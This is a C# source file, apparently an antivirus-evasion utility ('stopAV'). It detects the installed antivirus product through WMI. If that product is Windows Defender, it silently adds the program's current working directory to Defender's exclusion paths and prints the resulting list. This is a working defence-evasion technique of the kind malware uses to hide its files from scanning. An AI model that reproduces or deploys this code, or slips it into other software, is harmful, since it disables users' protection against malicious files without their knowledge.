using System;
using System.IO;
using System.Collections.ObjectModel;
using System.Management;

// Add Folder to Defender Exclusion running powershell script with-in C# .NET

namespace stopAV
{
    class primary
    {

        public static void defender_get()
        { 
            try
            {
                string sComputerID = null;
        ManagementObjectSearcher searcher = new ManagementObjectSearcher("root\\Microsoft\\Windows\\Defender", "SELECT * FROM MSFT_MpPreference");
                foreach (ManagementObject queryObj in searcher.Get())
                {
                    Console.WriteLine("-----------------------------------");
                    Console.WriteLine("MSFT_MpPreference instance");
                    Console.WriteLine("-----------------------------------");
                    sComputerID = queryObj["ComputerID"].ToString();
        Console.WriteLine("ComputerID: {0}", sComputerID);

                    if (queryObj["ExclusionPath"] == null)
                        Console.WriteLine("ExclusionPath: {0}", queryObj["ExclusionPath"]);
                    else
                    {
                        string[] arrExclusionPath = (string[])(queryObj["ExclusionPath"]);
                        foreach (string arrValue in arrExclusionPath)
                        {
                            Console.WriteLine("ExclusionPath: {0}", arrValue);
                        }
}
                }
            }
            catch (ManagementException ex)
            {
                Console.WriteLine("An error occurred while querying for WMI data: " + ex.Message);
            }
    }
        public static void defender()
        {
            
            try
            {
                string sPath = "MSFT_MpPreference.ComputerID='" + Environment.MachineName + "'";
                ManagementObject classInstance = new ManagementObject("root\\Microsoft\\Windows\\Defender",
                   sPath,
                   null);

                ManagementBaseObject inParams = classInstance.GetMethodParameters("Add");
                string path = Directory.GetCurrentDirectory();
                string[] arrExclusionPath = new string[1];
                arrExclusionPath[0] = path;
                inParams["ExclusionPath"] = arrExclusionPath;

                ManagementBaseObject outParams = classInstance.InvokeMethod("Add", inParams, null);
            }
            catch (ManagementException ex)
            {
                Console.WriteLine("An error occurred while trying to execute the WMI method: " + ex.Message);
            }
        }
        public static object AntivirusInstalled()
            {
                string wmipathstr = @"\\" + Environment.MachineName + @"\root\SecurityCenter2";
                try
                {
                    ManagementObjectSearcher searcher = new ManagementObjectSearcher(wmipathstr, "SELECT * FROM AntivirusProduct");
                    ManagementObjectCollection instances = searcher.Get();
                    foreach (ManagementObject virusChecker in instances)
                {
                    return virusChecker["displayName"];
                }

                }

                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                }

                return false;
            }

            public static void Main(string[] args)
            {
                object returnValue = AntivirusInstalled();
                Console.WriteLine("Antivirus Installed: " + returnValue.ToString());
                Console.WriteLine();

                switch (returnValue.ToString())
                    {
                case "Windows Defender":
                    defender();
                    defender_get();
                    Console.Read();
                    break;
                default:
                    Console.WriteLine("This script doesn't support your AV");
                    Console.Read();
                    break;


            }
            }


        }
}